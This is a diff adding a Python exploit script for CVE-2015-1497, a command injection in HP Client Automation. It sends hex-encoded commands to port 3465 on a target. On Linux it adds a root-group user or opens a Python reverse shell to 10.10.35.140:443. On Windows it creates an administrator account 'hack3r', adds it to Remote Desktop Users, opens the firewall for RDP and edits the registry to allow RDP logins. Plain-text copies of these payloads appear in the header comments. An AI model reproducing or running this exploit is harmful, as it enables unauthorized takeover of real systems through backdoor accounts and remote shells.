@@ -1,0 +1,212 @@
+# Exploit Title: [HP Client - Automation Command Injection]
+# Date: [10/10/2016]
+# Exploit Author: [SlidingWindow] , Twitter: @kapil_khot
+# Vendor Homepage: [Previosuly HP, now http://www.persistentsys.com/]
+# Version: [Tested on version 7.9 but should work on  8.1, 9.0, 9.1 too]
+# Tested on: [Windows 7 and CentOS release 6.7 (Final)]
+# CVE : [CVE-2015-1497]
+
+#Can run following commands on linux target
+	#Useradd Payload: hide hide	sh -c ' useradd amiroot -p ID/JlXFIWowsE  -g root'
+	#Reverse Shell Payload: hide hide 	sh -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.35.140\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+
+
+#Runs following commands on Windows target
+	#hide hide 	cmd.exe /c net user hack3r "hack3r" /add
+	#hide hide 	cmd.exe /c net localgroup administrators hack3r /add
+	#hide hide 	cmd.exe /c net localgroup "Remote Desktop Users" hack3r /add
+	#hide hide 	cmd.exe /c netsh firewall set service RemoteDesktop enable
+	#hide hide 	cmd/exe /c netsh firewall set service type=RemoteDesktop mode=enable profile=ALL
+	#hide hide 	cmd/exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+
+import sys,socket
+
+print("\n# Exploit Title: [HP Client - Automation Command Injection]\n# Date: [10/10/2016]\n# Exploit Author: [SlidingWindow] , Twitter: @kapil_khot\n# Vendor Homepage: [Previosuly HP, now http://www.persistentsys.com/]\n# Version: [7.9, 8.1, 9.0, 9.1]\n# Tested on: [Windows 7, CentOS release 6.7 (Final)]\n# CVE : [CVE-2015-1497]\n")
+
+def exploit_Linux(target_IP,exploit_param):
+	if exploit_param == "1":
+		print("\n[+]Adding privileged user amiroot/nopass")
+		request = "\x00"
+		request+= "\x31\x32\x33\x31\x32\x33\x00"
+		request+= "\x41\x42\x43\x00"
+		request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x73\x68\x20\x2d\x63\x20\x27\x20\x75\x73\x65\x72\x61\x64\x64\x20\x61\x6d\x69\x72\x6f\x6f\x74\x20\x2d\x70\x20\x49\x44\x2f\x4a\x6c\x58\x46\x49\x57\x6f\x77\x73\x45\x20\x20\x2d\x67\x20\x72\x6f\x6f\x74\x27\x00"
+
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((target_IP, 3465))
+		s.send(request)
+
+		response = s.recv(1024)
+
+		if response == "\x00":
+			print("[+]Successfully added user amiroot/nopass")
+		else:
+			print("[-]Failed to add user amiroot/nopass")
+		s.close()
+
+	elif exploit_param == "2":
+		print("\n[+]Trying to get a reverse shell")
+		request = "\x00"
+		request+= "\x31\x32\x33\x31\x32\x33\x00"
+		request+= "\x41\x42\x43\x00"
+
+		#Change this
+		#Reverse Shell Payload: hide hide	sh -c "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.35.140\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+		request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x73\x68\x20\x2d\x63\x20\x22\x70\x79\x74\x68\x6f\x6e\x20\x2d\x63\x20\x27\x69\x6d\x70\x6f\x72\x74\x20\x73\x6f\x63\x6b\x65\x74\x2c\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2c\x6f\x73\x3b\x73\x3d\x73\x6f\x63\x6b\x65\x74\x2e\x73\x6f\x63\x6b\x65\x74\x28\x73\x6f\x63\x6b\x65\x74\x2e\x41\x46\x5f\x49\x4e\x45\x54\x2c\x73\x6f\x63\x6b\x65\x74\x2e\x53\x4f\x43\x4b\x5f\x53\x54\x52\x45\x41\x4d\x29\x3b\x73\x2e\x63\x6f\x6e\x6e\x65\x63\x74\x28\x28\x5c\x22\x31\x30\x2e\x31\x30\x2e\x33\x35\x2e\x31\x34\x30\x5c\x22\x2c\x34\x34\x33\x29\x29\x3b\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x30\x29\x3b\x20\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x31\x29\x3b\x20\x6f\x73\x2e\x64\x75\x70\x32\x28\x73\x2e\x66\x69\x6c\x65\x6e\x6f\x28\x29\x2c\x32\x29\x3b\x70\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x63\x61\x6c\x6c\x28\x5b\x5c\x22\x2f\x62\x69\x6e\x2f\x73\x68\x5c\x22\x2c\x5c\x22\x2d\x69\x5c\x22\x5d\x29\x3b\x27\x22\x00"
+
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((target_IP, 3465))
+		s.send(request)
+
+		response = s.recv(1024)
+
+		if response == "\x00":
+			print("[+]Exploit completed successfully.\n[+]Try to SSH into the target with username/password: amiroot/nopass")
+		else:
+			print("[-]Failed to get reverse shell")
+		s.close()
+
+	else:
+		print("\n[-]Invalid exploit parameter provided for Linux target")
+		sys.exit()
+
+
+def exploit_Windows(target_IP):
+	
+	counter = 0
+	print("[+]Adding a local user hack3r/hack3r")
+
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73\x65\x72\x20\x68\x61\x63\x6b\x33\x72\x20\x22\x68\x61\x63\x6b\x33\x72\x22\x20\x2f\x61\x64\x64\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+
+	response = s.recv(1024)
+
+	if response == "\x00":
+		print("[+]Successfully added user hack3r/hack3r")
+		counter+= 1
+	else:
+		print("[-]Failed to add user hack3r/hack3r")
+	s.close()
+
+
+	print("[+]Adding user 'hack3r' to Local Administrator's group")
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x61\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x68\x61\x63\x6b\x33\x72\x20\x2f\x61\x64\x64\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+	response = s.recv(1024)
+
+	if response == "\x00":
+		print("[+]Successfully added user 'hack3r' to Local Administrators group")
+		counter+= 1
+	else:
+		print("[-]Failed to add user to 'hack3r' Local Administrators group")
+	s.close()
+
+	#Add user Hack3r to "Remote Desktop Users" Group
+	print("[+]Adding user 'hack3r' to 'Remote Desktop Users' group")
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x22\x52\x65\x6d\x6f\x74\x65\x20\x44\x65\x73\x6b\x74\x6f\x70\x20\x55\x73\x65\x72\x73\x22\x20\x68\x61\x63\x6b\x33\x72\x20\x2f\x61\x64\x64\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+	response = s.recv(1024)
+	
+	if response == "\x00":
+		print("[+]Successfully added user 'hack3r' to 'Remote Desktop Users' group")
+		counter+= 1
+	else:
+		print("[-]Failed to add user 'hack3r' to 'Remote Desktop Users' group")
+	s.close()
+
+	#Enable RDP
+	print("[+]Trying to enable Remote Desktop Service")
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x73\x68\x20\x66\x69\x72\x65\x77\x61\x6c\x6c\x20\x73\x65\x74\x20\x73\x65\x72\x76\x69\x63\x65\x20\x52\x65\x6d\x6f\x74\x65\x44\x65\x73\x6b\x74\x6f\x70\x20\x65\x6e\x61\x62\x6c\x65\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+	response = s.recv(1024)
+	
+	if response == "\x00":
+		print("[+]Successfully enabled Remote Desktop Service")
+		counter+= 1
+	else:
+		print("[-]Failed to enable Remote Desktop Service")
+	s.close()
+
+
+	#Enable RDP for all profiles
+	print("[+]Trying to enable Remote Desktop Service for all firewall profiles")
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x73\x68\x20\x66\x69\x72\x65\x77\x61\x6c\x6c\x20\x73\x65\x74\x20\x73\x65\x72\x76\x69\x63\x65\x20\x74\x79\x70\x65\x3d\x52\x65\x6d\x6f\x74\x65\x44\x65\x73\x6b\x74\x6f\x70\x20\x6d\x6f\x64\x65\x3d\x65\x6e\x61\x62\x6c\x65\x20\x70\x72\x6f\x66\x69\x6c\x65\x3d\x41\x4c\x4c\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+	response = s.recv(1024)
+	
+	if response == "\x00":
+		print("[+]Successfully enabled Remote Desktop Service for all firewall profiles")
+		counter+= 1
+	else:
+		print("[-]Failed to enable Remote Desktop Service for all firewall  profiles")
+	s.close()
+
+	#Setup target to listen for RDP connections
+	print("[+]Setting up the target server to listen to RDP connections")
+	request = "\x00"
+	request+= "\x31\x32\x33\x31\x32\x33\x00"
+	request+= "\x41\x42\x43\x00"
+	request+= "\x68\x69\x64\x65\x20\x68\x69\x64\x65\x09\x09\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x72\x65\x67\x20\x61\x64\x64\x20\x22\x48\x4b\x45\x59\x5f\x4c\x4f\x43\x41\x4c\x5f\x4d\x41\x43\x48\x49\x4e\x45\x5c\x53\x59\x53\x54\x45\x4d\x5c\x43\x75\x72\x72\x65\x6e\x74\x43\x6f\x6e\x74\x72\x6f\x6c\x53\x65\x74\x5c\x43\x6f\x6e\x74\x72\x6f\x6c\x5c\x54\x65\x72\x6d\x69\x6e\x61\x6c\x20\x53\x65\x72\x76\x65\x72\x22\x20\x2f\x76\x20\x66\x44\x65\x6e\x79\x54\x53\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x73\x20\x2f\x74\x20\x52\x45\x47\x5f\x44\x57\x4f\x52\x44\x20\x2f\x64\x20\x30\x20\x2f\x66\x00"
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((target_IP, 3465))
+	s.send(request)
+	response = s.recv(1024)
+	
+	if response == "\x00":
+		print("[+]Successfully setup the target server to listen to RDP connections")
+		counter+= 1
+	else:
+		print("[-]Failed to setup the target server to listen to RDP connections")
+	s.close()
+
+	if counter == 6:
+		print("\n[+]Exploit completed successfully. Try RDP to the target with username/password: hack3r/hack3r")
+	else:
+		print("\n[-]Exploit Failed..")
+
+#main() function here
+def main():
+	
+	if len(sys.argv) < 2:
+		print "\n[-]Usage: \nWindows Target:\n\tpython HP_Client_Automation_Exploit.py <target_ip> Windows\n\nLinux Target:\n\tpython HP_Client_Automation_Exploit.py <target_ip> Linux [1|2]\n\t\t1.Add user\n\t\t2.Reverse Shell"
+		sys.exit()
+
+	target_IP = sys.argv[1]
+	target_OS = sys.argv[2].lower()
+	
+	if target_OS == "windows":
+		exploit_Windows(target_IP)
+	elif target_OS == "linux":
+		exploit_param = sys.argv[3]
+		exploit_Linux(target_IP,exploit_param)
+	else:
+		print("\n[-]Invalid taret Operating System selected.")
+		sys.exit()
+		
+if __name__ == '__main__':
+	main()
